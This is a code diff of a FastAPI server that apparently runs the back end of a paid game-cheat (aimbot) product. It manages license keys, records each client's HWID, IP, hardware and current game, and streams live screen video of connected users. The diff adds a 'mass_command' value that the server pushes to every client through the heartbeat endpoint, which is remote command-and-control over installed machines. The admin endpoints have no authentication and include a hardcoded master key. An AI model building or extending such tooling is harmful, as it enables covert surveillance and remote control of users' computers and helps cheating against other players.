@@ -7,7 +7,7 @@ from fastapi.responses import HTMLResponse, StreamingResponse
 from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
 
-app = FastAPI(title="Assmar00 God-Mode Complete Backend", version="4.0")
+app = FastAPI(title="Assmar00 God-Mode Complete Backend", version="5.0")
 
 app.add_middleware(
     CORSMiddleware,
@@ -17,14 +17,12 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# SQLite Datenbank initialisieren
 DB_FILE = "database.db"
 
 def init_db():
     conn = sqlite3.connect(DB_FILE)
     cursor = conn.cursor()
     
-    # Clients / Sessions Tabelle
     cursor.execute("""
         CREATE TABLE IF NOT EXISTS clients (
             desktop TEXT PRIMARY KEY,
@@ -37,7 +35,6 @@ def init_db():
         )
     """)
     
-    # Lizenz-Schlüssel Tabelle
     cursor.execute("""
         CREATE TABLE IF NOT EXISTS keys (
             key_code TEXT PRIMARY KEY,
@@ -47,7 +44,17 @@ def init_db():
         )
     """)
     
-    # Tickets Tabelle
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS global_settings (
+            key TEXT PRIMARY KEY,
+            value TEXT
+        )
+    """)
+    
+    # Standard-Einstellungen initialisieren
+    cursor.execute("INSERT OR IGNORE INTO global_settings (key, value) VALUES ('aimbot_allowed', 'true')")
+    cursor.execute("INSERT OR IGNORE INTO global_settings (key, value) VALUES ('mass_command', '')")
+    
     cursor.execute("""
         CREATE TABLE IF NOT EXISTS tickets (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -59,7 +66,6 @@ def init_db():
         )
     """)
     
-    # Standard-Key einfügen, falls noch keiner existiert (damit du direkt testen kannst)
     cursor.execute("""
         INSERT OR IGNORE INTO keys (key_code, note, expiry, status)
         VALUES ('ASR-9812-PAUL', 'Master Standard Key', '2026-12-31', 'Aktiv')
@@ -78,7 +84,6 @@ class ClientData(BaseModel):
     cpu: str = "Unknown"
     game: str = "Idle"
 
-# 1. Admin-Panel direkt ausliefern
 @app.get("/", response_class=HTMLResponse)
 def serve_admin():
     try:
@@ -87,28 +92,19 @@ def serve_admin():
     except FileNotFoundError:
         return "<h3>Fehler: admin.html wurde im GitHub-Repository nicht gefunden!</h3>"
 
-# 2. Statistiken für das Dashboard
 @app.get("/api/stats")
 def get_stats():
     conn = sqlite3.connect(DB_FILE)
     cursor = conn.cursor()
     cursor.execute("SELECT COUNT(*) FROM clients")
     active_clients = cursor.fetchone()[0]
-    
     cursor.execute("SELECT COUNT(*) FROM tickets WHERE status='Offen'")
     open_tickets = cursor.fetchone()[0]
-    
     cursor.execute("SELECT COUNT(*) FROM keys")
     total_keys = cursor.fetchone()[0]
     conn.close()
-    
-    return {
-        "active_clients": active_clients,
-        "open_tickets": open_tickets,
-        "total_keys": total_keys
-    }
+    return {"active_clients": active_clients, "open_tickets": open_tickets, "total_keys": total_keys}
 
-# 3. Liste aller verbundenen User abrufen
 @app.get("/api/users")
 def get_users():
     conn = sqlite3.connect(DB_FILE)
@@ -119,7 +115,6 @@ def get_users():
     conn.close()
     return [dict(row) for row in rows]
 
-# 4. Heartbeat von echten Clients
 @app.post("/api/client/heartbeat")
 def client_heartbeat(data: ClientData):
     conn = sqlite3.connect(DB_FILE)
@@ -136,10 +131,24 @@ def client_heartbeat(data: ClientData):
         last_seen=CURRENT_TIMESTAMP
     """, (data.desktop, data.custom_name, data.hwid, data.ip, data.cpu, data.game))
     conn.commit()
-    conn.close()
-    return {"status": "success"}
+    
+    # Aktuelle globale Befehle für diesen Client auslesen
+    cursor.execute("SELECT value FROM global_settings WHERE key='mass_command'")
+    cmd_row = cursor.fetchone()
+    mass_cmd = cmd_row[0] if cmd_row else ""
 
-# 5. Live Screen Video Feed
+    cursor.execute("SELECT value FROM global_settings WHERE key='aimbot_allowed'")
+    aim_row = cursor.fetchone()
+    aimbot_allowed = aim_row[0] == 'true' if aim_row else True
+
+    conn.close()
+    
+    return {
+        "status": "success", 
+        "command": mass_cmd,
+        "aimbot_allowed": aimbot_allowed
+    }
+
 @app.get("/video_feed")
 def video_feed(user: str):
     def generate_stream():
@@ -162,16 +171,13 @@ def video_feed(user: str):
 
     return StreamingResponse(generate_stream(), media_type="multipart/x-mixed-replace; boundary=frame")
 
-# 6. NEU: Key über das Admin-Panel erstellen / speichern
 @app.post("/api/keys/create")
 def create_key_api(data: dict):
     key_code = data.get("key_code")
     note = data.get("note", "")
     expiry = data.get("expiry", "2026-12-31")
-    
     if not key_code:
         raise HTTPException(status_code=400, detail="Key Code fehlt")
-        
     conn = sqlite3.connect(DB_FILE)
     cursor = conn.cursor()
     cursor.execute("""
@@ -182,7 +188,6 @@ def create_key_api(data: dict):
     conn.close()
     return {"status": "success", "message": f"Key {key_code} erfolgreich erstellt!"}
 
-# 7. NEU: Alle Keys für das Panel abrufen
 @app.get("/api/keys")
 def get_keys():
     conn = sqlite3.connect(DB_FILE)
@@ -193,7 +198,19 @@ def get_keys():
     conn.close()
     return [dict(row) for row in rows]
 
-# 8. NEU: Lizenz-Verifizierung für deinen Python-Loader (`firefox.py`)
+@app.post("/api/settings/update")
+def update_settings(data: dict):
+    conn = sqlite3.connect(DB_FILE)
+    cursor = conn.cursor()
+    for k, v in data.items():
+        cursor.execute("""
+            INSERT INTO global_settings (key, value) VALUES (?, ?)
+            ON CONFLICT(key) DO UPDATE SET value=excluded.value
+        """, (k, str(v)))
+    conn.commit()
+    conn.close()
+    return {"status": "success", "message": "Einstellungen synchronisiert!"}
+
 @app.post("/verify")
 def verify_license_endpoint(data: dict):
     key = data.get("key")
@@ -202,7 +219,6 @@ def verify_license_endpoint(data: dict):
     cursor.execute("SELECT * FROM keys WHERE key_code=? AND status='Aktiv'", (key,))
     row = cursor.fetchone()
     conn.close()
-    
     if row:
         return {"success": True, "message": "Key validiert", "expiry": row[2]}
     else:
